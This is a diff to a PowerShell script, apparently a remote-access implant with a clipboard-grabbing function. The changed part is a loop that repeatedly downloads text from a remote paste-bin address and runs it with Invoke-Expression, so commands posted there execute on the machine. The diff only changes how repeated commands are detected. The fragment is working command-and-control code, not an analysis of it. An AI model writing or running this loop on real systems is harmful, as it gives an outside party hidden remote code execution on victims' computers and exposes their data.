@@ -170,16 +170,18 @@ function GetClipboard {
 
 ##########################
 $commands = @()
+$previousBinText = ""
 
 while ($true) {
-
     $PastBinText = (Invoke-WebRequest $bin).Content
-    if($commands -contains $PastBinText -or $commands -ccontains $PastBinText ){
+    
+    if ($PastBinText -eq $previousBinText) {
         Start-Sleep 10
     }
     else {
         Invoke-Expression $PastBinText
         $commands += $PastBinText
+        $previousBinText = $PastBinText
     }
 }
 
